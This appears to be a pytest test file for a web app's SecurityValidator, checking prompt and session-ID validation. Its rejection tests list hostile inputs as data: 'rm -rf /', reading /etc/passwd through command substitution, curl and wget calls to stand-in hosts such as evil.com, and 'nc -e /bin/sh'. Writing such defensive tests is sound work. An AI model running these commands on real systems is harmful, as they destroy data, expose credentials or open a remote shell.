"""
Tests for SecurityValidator.

Covers:
- Prompt validation (empty, length, dangerous patterns)
- Session ID validation (format, length)
"""

import pytest
from fastapi import HTTPException

from app.core.security import SecurityValidator


class TestValidatePrompt:
    """Tests for validate_prompt method."""

    def test_empty_prompt_raises_exception(self):
        """Test: Empty string raises HTTPException 400."""
        with pytest.raises(HTTPException) as exc_info:
            SecurityValidator.validate_prompt("")

        assert exc_info.value.status_code == 400
        assert "empty" in exc_info.value.detail.lower()

    def test_whitespace_only_prompt_raises_exception(self):
        """Test: Whitespace-only string raises HTTPException 400."""
        with pytest.raises(HTTPException) as exc_info:
            SecurityValidator.validate_prompt("   \t\n   ")

        assert exc_info.value.status_code == 400
        assert "empty" in exc_info.value.detail.lower()

    def test_too_long_prompt_raises_exception(self):
        """Test: Prompt exceeding max length raises HTTPException 400."""
        from app.core.config import settings

        long_prompt = "a" * (settings.max_prompt_length + 1)

        with pytest.raises(HTTPException) as exc_info:
            SecurityValidator.validate_prompt(long_prompt)

        assert exc_info.value.status_code == 400
        assert "too long" in exc_info.value.detail.lower()

    def test_control_characters_raises_exception(self):
        """Test: Control characters raise HTTPException 400."""
        dangerous_prompts = [
            "Hello\x00World",  # Null byte
            "Test\x07text",  # Bell character
            "Data\x1fhere",  # Unit separator
        ]

        for prompt in dangerous_prompts:
            with pytest.raises(HTTPException) as exc_info:
                SecurityValidator.validate_prompt(prompt)

            assert exc_info.value.status_code == 400
            assert "dangerous" in exc_info.value.detail.lower()

    def test_shell_injection_chars_raises_exception(self):
        """Test: Shell injection characters raise HTTPException 400."""
        dangerous_prompts = [
            "ls; rm -rf /",  # Semicolon
            "cat file & echo",  # Ampersand
            "test | grep",  # Pipe
            "hello `whoami`",  # Backticks
            "price is $100",  # Dollar sign
        ]

        for prompt in dangerous_prompts:
            with pytest.raises(HTTPException) as exc_info:
                SecurityValidator.validate_prompt(prompt)

            assert exc_info.value.status_code == 400
            assert "dangerous" in exc_info.value.detail.lower()

    def test_command_substitution_raises_exception(self):
        """Test: Command substitution patterns raise HTTPException 400."""
        dangerous_prompts = [
            "$(whoami)",
            "Hello $(cat /etc/passwd)",
            "$(rm -rf /)",
        ]

        for prompt in dangerous_prompts:
            with pytest.raises(HTTPException) as exc_info:
                SecurityValidator.validate_prompt(prompt)

            assert exc_info.value.status_code == 400
            assert "dangerous" in exc_info.value.detail.lower()

    def test_network_commands_raises_exception(self):
        """Test: Network commands raise HTTPException 400."""
        dangerous_prompts = [
            "curl http://evil.com",
            "wget http://malware.com",
            "nc -e /bin/sh",
            "netcat localhost 4444",
            "CURL http://test.com",  # Case insensitive
        ]

        for prompt in dangerous_prompts:
            with pytest.raises(HTTPException) as exc_info:
                SecurityValidator.validate_prompt(prompt)

            assert exc_info.value.status_code == 400
            assert "dangerous" in exc_info.value.detail.lower()

    def test_valid_prompt_returns_stripped(self):
        """Test: Valid prompt returns stripped string."""
        result = SecurityValidator.validate_prompt("  Hello, how are you?  ")

        assert result == "Hello, how are you?"

    def test_valid_prompt_with_normal_text(self):
        """Test: Normal text passes validation."""
        prompts = [
            "What is the weather today?",
            "Explain quantum physics",
            "Write a poem about cats",
            "How do I cook pasta?",
            "Расскажи о Python",  # Russian text
        ]

        for prompt in prompts:
            result = SecurityValidator.validate_prompt(prompt)
            assert result == prompt.strip()


class TestValidateSessionId:
    """Tests for validate_session_id method."""

    def test_too_short_session_id_raises_exception(self):
        """Test: Session ID < 8 chars raises HTTPException 400."""
        with pytest.raises(HTTPException) as exc_info:
            SecurityValidator.validate_session_id("abc123")  # 6 chars

        assert exc_info.value.status_code == 400
        assert "invalid" in exc_info.value.detail.lower()

    def test_too_long_session_id_raises_exception(self):
        """Test: Session ID > 64 chars raises HTTPException 400."""
        long_id = "a" * 65

        with pytest.raises(HTTPException) as exc_info:
            SecurityValidator.validate_session_id(long_id)

        assert exc_info.value.status_code == 400
        assert "invalid" in exc_info.value.detail.lower()

    def test_invalid_characters_raises_exception(self):
        """Test: Invalid characters raise HTTPException 400."""
        invalid_ids = [
            "session@123",  # @ symbol
            "session 123",  # Space
            "session.123",  # Dot
            "session/123",  # Slash
            "session#123",  # Hash
        ]

        for session_id in invalid_ids:
            with pytest.raises(HTTPException) as exc_info:
                SecurityValidator.validate_session_id(session_id)

            assert exc_info.value.status_code == 400

    def test_valid_session_id_returns_id(self):
        """Test: Valid session IDs pass validation."""
        valid_ids = [
            "abcd1234",  # 8 chars - minimum
            "session_123",  # Underscore allowed
            "session-123",  # Hyphen allowed
            "ABC123xyz",  # Mixed case
            "a" * 64,  # 64 chars - maximum
        ]

        for session_id in valid_ids:
            result = SecurityValidator.validate_session_id(session_id)
            assert result == session_id